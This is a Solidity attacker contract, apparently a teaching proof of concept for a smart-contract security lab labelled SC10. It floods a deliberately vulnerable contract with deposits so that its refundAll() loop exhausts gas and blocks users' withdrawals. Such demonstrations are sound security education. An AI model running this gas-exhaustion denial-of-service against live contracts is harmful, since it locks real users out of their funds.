// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC10_DoS_Vulnerable.sol";

/*
 * DoS Attacker Contract for SC10
 * 
 * This contract demonstrates how to exploit the DoS vulnerability by:
 * 1. Creating many deposit transactions to fill the users array
 * 2. Making the refundAll() function consume too much gas
 * 3. Preventing legitimate users from performing withdrawals
 */

contract SC10_DoSAttacker {
    SC10_DoS_Vulnerable public targetContract;
    address public owner;

    constructor(address _targetAddress) {
        targetContract = SC10_DoS_Vulnerable(_targetAddress);
        owner = msg.sender;
    }

    // Attacker floods the contract with many deposits
    function floodContract(uint256 count) external payable {
        require(msg.value >= count * 0.1 ether, "Insufficient funds");

        for (uint256 i = 0; i < count; i++) {
            targetContract.deposit{value: 0.1 ether}();
        }
    }

    // Attacker can also spam from an intermediary contract
    // This increases the cost for legitimate operations
    receive() external payable {
        // Do nothing - just accept ETH
    }

    // Attempts to call refundAll to demonstrate DoS
    // This will fail or consume enormous amounts of gas with many users
    function triggerDoS() external {
        try targetContract.refundAll() {
            // Success - unlikely with many users
        } catch {
            // Expected to fail with "out of gas" or other errors
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    function getTargetUserCount() external view returns (uint256) {
        return targetContract.getUserCount();
    }

    function getTargetBalance() external view returns (uint256) {
        return address(targetContract).balance;
    }
}
